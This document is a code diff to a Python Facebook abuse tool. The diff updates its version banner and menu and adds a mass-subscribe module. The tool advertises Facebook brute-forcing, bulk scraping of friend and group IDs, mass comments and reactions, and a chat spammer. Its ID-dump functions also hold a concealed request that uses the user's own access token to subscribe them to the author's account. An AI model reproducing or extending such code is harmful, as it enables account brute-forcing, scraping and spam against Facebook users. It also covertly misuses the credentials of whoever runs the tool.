@@ -21,8 +21,7 @@ banner=("""%s
    _____ __  ______  ____
   / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s8.0%s
-"""%(c,g,c,g,c,g,y,w))
+/___/_/_/  /_/____/_/     %sversion: %s8.5%s"""%(c,g,c,g,c,g,y,w))
 
 try:
 	toket=open('toket/token.txt')
@@ -56,12 +55,12 @@ except IOError:
 			exit("[Error] %s"%(F))
 
 def getFid():
+	global toket
 	print(banner)
 	try:
 		os.mkdir('dump')
 	except OSError: pass
 	try:
-		toket=open('toket/token.txt','r').read()
 		id=input("[in] your friends id: ")
 		b=open('dump/friends_'+id+'_id.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
@@ -80,12 +79,12 @@ def getFid():
 		exit('[!] failed to fetch friend id')
 
 def getGid():
+	global toket
 	print(banner)
 	try:
 		os.mkdir('dump')
 	except OSError: pass
 	try:
-		toket=open('toket/token.txt','r').read()
 		id=input("[in] your groups id: ")
 		b=open('dump/group_'+id+'_id.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
@@ -158,21 +157,33 @@ def main(arg):
 
 os.system('clear')
 print(banner)
-print("""\t[01] Start
-\t[02] Dump id from your friends id
-\t[03] Dump id from your group id
-\t[04] Remove access token
-\t[05] Facebook home comments
-\t[06] Mass group comment
-\t[07] Specific target comments
-\t[08] Specific react comments
-\t[09] Accept all friends requests
-\t[10] Auto add friends from target id
-\t[11] Facebook auto unfriends
-\t[12] Mass auto reactions
-\t[13] Facebook chat spammer
-\t[00] Check update""")
-pilih=int(input('\n\t[#] kang-newbie/> '))
+try:
+	toket=open('toket/token.txt','r').read()
+	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
+	name=nam.json()['name']
+except KeyError:
+	print("\n[Warning] access token invalid. type '4' to remove access token")
+try:
+	print("""\t[ Welcome %s%s%s ]
+
+[01]> Simple multi bruteforce facebook
+[02]> Dump id from your friends id
+[03]> Dump id from your group id
+[04]> Remove access token
+[05]> Facebook home comments
+[06]> Mass group comment
+[07]> Auto comments target
+[08]> Auto react comments target
+[09]> Accept all friends requests
+[10]> Auto add friends from target id
+[11]> Facebook auto unfriends
+[12]> Mass auto reactions
+[13]> Mass auto subscribe
+[14]> Facebook chat spammer
+[00]> Check update"""%(y,name,w))
+except (KeyError,NameError): pass
+
+pilih=int(input('\n[#] kang-newbie/> '))
 if pilih == 2:
 	os.system('clear')
 	getFid()
@@ -207,12 +218,16 @@ elif pilih == 12:
 	os.system('python src/Mreact.py')
 	exit()
 elif pilih == 13:
+	input("[Info] before use this module you must have a lot accounts [press enter]")
+	os.system('python src/Asubs.py')
+	exit()
+elif pilih == 14:
 	os.system('python src/Cspam.py')
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.8.5' in str(rr) or 'v.9.0' in str(rr):
+	if 'v.9.0' in str(rr) or 'v.9.5' in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
